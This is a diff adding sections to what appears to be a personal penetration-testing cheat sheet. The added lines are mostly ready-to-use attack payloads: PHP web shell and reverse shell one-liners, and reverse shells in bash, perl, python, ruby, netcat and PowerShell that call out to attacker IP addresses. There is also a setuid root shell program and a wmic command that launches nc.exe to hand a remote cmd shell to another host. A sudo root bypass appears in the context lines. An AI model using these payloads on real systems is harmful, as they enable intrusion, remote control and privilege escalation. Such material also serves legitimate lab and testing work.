@@ -271,3 +271,76 @@ When a file is opene a tool that creates multiple pages beyond the bounds of you
 If sudo is < 1.8.28 there's an easy bypass to root
 
 &nbsp;&nbsp;&nbsp;&nbsp;<code>sudo -u#-1 /bin/bash</code>
+
+### php one liners
+
+just some useful php one liner commands if you can get code exec in php
+~~~
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+<?php $sock=fsockopen("192.168.1.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
+
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f"); ?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'");?>
+
+~~~
+
+### reverse shells
+
+~~~
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+nc -e /bin/sh 10.0.0.1 1234
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f #if you encounter the nc without -e option
+
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENERIP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+ 
+ ~~~
+ 
+ ### Quick setuid binary
+ 
+ useful if you can get a process like a cron job to run a binary for example...
+ 
+ 
+ make a file with this:
+ 
+ ~~~
+ #include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+~~~
+
+then compile and run it as root
+
+~~~
+gcc exploit.c -m32 -o exploit
+~~~
+
+### Using WMIC to runas a different user in a non-interactive session
+
+By default in Windows, you cannot use the <code>runas</code> without on interactive shell/cmd prompt (typical if you just have an nc shell or just remote code execution for some one-liners). So, you can use wmic to launch a process with a password on the cmd line as another user. Bonus points if you have admin creds
+
+~~~
+
+c:\Users\mssql-svc\Desktop>wmic /user:backdoor2 /password:password123 process call create "c:\users\mssql-svc\desktop\nc.exe 10.10.14.3 444 -e c:\windows\system32\cmd.exe"
+
+~~~
+
